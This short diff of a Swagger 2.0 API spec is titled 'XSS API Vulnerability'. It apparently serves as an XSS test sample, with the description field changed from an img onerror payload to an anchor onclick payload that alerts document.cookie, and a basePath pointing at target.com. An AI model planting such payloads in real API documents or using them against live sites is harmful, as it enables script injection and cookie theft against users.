@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: XSS API Vulnerability
   description: |
-    <img src=xss onerror=alert(1)>
+    <a onclick=alert(document.cookie)>Click Me!</a>
 
   version: production
 basePath: https://target.com
